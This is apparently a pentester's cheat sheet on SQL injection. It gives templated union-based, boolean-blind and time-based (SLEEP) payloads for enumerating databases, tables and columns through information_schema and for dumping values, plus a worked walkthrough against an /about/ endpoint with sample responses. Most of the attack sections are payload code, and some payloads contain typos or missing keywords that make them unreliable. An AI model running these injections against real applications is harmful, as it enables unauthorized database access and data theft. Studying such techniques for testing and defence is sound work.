---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SQL Injection

**SQL Injection (SQLi)** is a common and dangerous web security vulnerability that allows attackers to interfere with the queries an application makes to its database.&#x20;

<figure><img src="../../.gitbook/assets/image (277).png" alt="" width="375"><figcaption></figcaption></figure>

It occurs when untrusted input is inserted directly into an SQL query without proper validation or sanitization, enabling the attacker to execute malicious SQL commands.

There are various forms of SQL injection attacks, each targeting different aspects of how SQL queries interact with the database.

## <mark style="color:blue;">In-Band</mark>&#x20;

Refers to the same method of communication being used to exploit the vulnerability and also receive the results.

### <mark style="color:purple;">Union-Based</mark>

Use the SQL `UNION` operator to return additional results to the page, letting the extraction of large amounts of data.

#### <mark style="color:orange;">Case 1</mark>

* Determining the number of columns

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$value UNION SELECT 1
$url/query?$column=$value UNION SELECT 1,2   #Try with a extra value
$url/query?$column=$value UNION SELECT 1,2,3 #Try Until there's no message error
#This won't show a message error when the number of columns coincides  
```
{% endcode %}

***

* Change query value

<pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/query?$column=$changedvalue UNION SELECT $found
</strong><strong>#Change until no results are shown to determine the value
</strong></code></pre>

{% hint style="info" %}
`$found` is the union value that has been caught in the previous step
{% endhint %}

***

* Check database name

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue UNION $found,database() #Try to get database
#This will return the name of the DB we are searching
```
{% endcode %}

***

* Check information schema for DB and tables information

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue UNION $found,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '$dbfound'
#This will return a string with all tables of the database
```
{% endcode %}

{% hint style="info" %}
`$dbfound`is the result of the previous query
{% endhint %}

***

* Check information schema for DB and tables information

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue UNION $found,group_concat(colum_name) FROM information_schema.columns WHERE table_name = '$tablefound'
#This will return a string with all columns of the table
```
{% endcode %}

***

* Obtain the values that we were looking for

{% code overflow="wrap" lineNumbers="true" %}
```sql
0 UNION SELECT 1,2,group_concat($value1,$value2) FROM $tablefound
#Obtain values from the table we needed
```
{% endcode %}

***

#### <mark style="color:orange;">Case 2</mark>

* Check if  vulnerable by sending a malformed petition with `'`

{% code overflow="wrap" lineNumbers="true" %}
```sql
"GET /about/2' HTTP/1.1"
#We obtain a 500 error and this code
<code>SELECT firstName, lastName, pfpLink, role, bio FROM $tablename WHERE id = 2'</code>
```
{% endcode %}

***

* As we know the number of columns, we make a union to select the _column\_name_ parameter and leave the other columns as null to avoid error. Then we obtain info from the default db _information\_schema_ and select the _column_ parameter specifying the name of the table we need

{% code overflow="wrap" lineNumbers="true" %}
```sql
#Make the petition to an invalid value (-1) to avoid displaying an entry of the database instead of the column name
/about/-1 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name='$tablename'

 About | id None #The result obtained in the response
```
{% endcode %}

***

* Use _group\_concat()_ to get all columns

{% code overflow="wrap" lineNumbers="true" %}
```sql
/about/-1 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name='$tablename'

About | id,firstName,lastName,pfpLink,role,shortRole,bio,$columname None #The result obtained in the response
```
{% endcode %}

***

* Obtain the required information from the table

{% code overflow="wrap" lineNumbers="true" %}
```sql
/about/-1 UNION ALL SELECT $columname,null,null,null,null FROM $tablename WHERE id = 1
#The response is the information that we were looking for
```
{% endcode %}

### <mark style="color:purple;">Error-Based</mark>

Obtaining information about the database structure as error messages from the database are printed directly to the browser screen.

## <mark style="color:blue;">Blind (Inferential)</mark>

Results of the attack can't directly be seen on the screen, we get little to no feedback to confirm whether our injected queries were.

### <mark style="color:purple;">Boolean Based</mark>

Use the response we receive back from our injection if this only has two outcomes

* Check if the page has verification queries

<pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/$query?$column=$value
</strong></code></pre>

***

* Use union injection until the state changes

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' UNION SELECT 1;
$url/query?$column=$changedvalue' UNION SELECT 1,2;   #Try with a extra value
$url/query?$column=$changedvalue' UNION SELECT 1,2,3; #Try Until the result change
#This will determine the number of columns
```
{% endcode %}

***

* Find database name by iteration

<pre class="language-sql" data-overflow="wrap" data-line-numbers><code class="lang-sql"><strong>$url/query?$column=$changedvalue' UNION SELECT $found where database() like '%';
</strong>#The value % will match anything true
$url/query?$column=$changedvalue' UNION SELECT $found where database() like 'a%'; #Try a
$url/query?$column=$changedvalue' UNION SELECT $found where database() like 'b%'; #Try b
#Repeat with every letter until found a value that gets true
$url/query?$column=$changedvalue' UNION SELECT $found where database() like '$lettera%';
#Make the same process for the next value
$url/query?$column=$changedvalue' UNION SELECT $found where database() LIKE '$letter$letter2a$%';
#Repeat until all DB names have been found
</code></pre>

{% hint style="info" %}
`$found` is the union value that has been caught in the previous step

`$letter` is the value that returns true in each iteration
{% endhint %}

***

* Find Table name by iteration

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WHERE table_schema = '$dbfound' and table_name LIKE 'a%';
#Repeat until found all table names
```
{% endcode %}

***

* Find column by iteration

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WHERE table_schema = '$dbfound' and table_name = 'table' and column_name LIKE 'a%';
#Make an iterative process to find the column name
```
{% endcode %}

***

* Find objective value

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' FROM $table_found WHERE %column_found LIKE 'a%';
#Make an iterative process to find the value needed
```
{% endcode %}

***

* &#x20;Handle of value exceptions

{% hint style="warning" %}
If at any point of iteration, you found a value that you don't need to get you must exclude it to restringe your injection
{% endhint %}

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' UNION $found FROM information_schema.tables WHERE table_schema = '$dbfound' and and tablename != $notobjective and $table_name LIKE 'a%';
```
{% endcode %}

{% hint style="info" %}
`$notobjective`refers to the value that we found but we don't need
{% endhint %}

### <mark style="color:purple;">Time-Based</mark>

Make use of the time a response is generated to the request to determine if the query value was found or not. It is used when we don't get a visual return to the injection.

* Determining the number of columns

{% code overflow="wrap" lineNumbers="true" %}
```sql
$url/query?$column=$changedvalue' UNION SELECT SLEEP($time);
$url/query?$column=$changedvalue' UNION SELECT SLEEP($time),2;
#Try until the petition time is different
```
{% endcode %}

{% hint style="info" %}
The time of an error request is always less than a correct query.
{% endhint %}

***

* Make a Boolean-based iterative process to map DB, tables, and columns you need

{% code overflow="wrap" lineNumbers="true" %}
```sql
#Find DB name, table, and column by an iterative process using sleep
$url/query?$column=$changedvalue' UNION SELECT SLEEP($time),$found FROM information_schema.tables WHERE table_schema = '$dbfound' and table_name = 'table' and column_name LIKE '%';
#The values of each step are dictated by the time the response is sent
```
{% endcode %}

***

* Make Boolean based iterative process to find the value you need

{% code overflow="wrap" lineNumbers="true" %}
```sql
#Find DB name, table, and column by an iterative process using sleep
$url/query?$column=$changedvalue' UNION SELECT SLEEP($time),$found FROM $table_found WHERE $column_found 
```
{% endcode %}

## <mark style="color:blue;">Out Of Band</mark>

Depends on the DB feature of making some kind of external network call based on the results from an SQL query. Is classified by having two different communication channels:&#x20;

* One is to launch the attack where SQLi is made to send a query.
* The other is to gather the results intercepting response from a DB.

## <mark style="color:blue;">**Second-Order (Stored)**</mark>

In this scenario, the attacker injects malicious data into the system that is not immediately executed but is stored and later used by the application. The SQL injection occurs at a later time when the data is used in another query.

## <mark style="color:blue;">**NoSQL Injection**</mark>

Targets NoSQL databases using unstructured queries. These attacks typically exploit applications that handle user input unsafely when interacting with NoSQL databases.
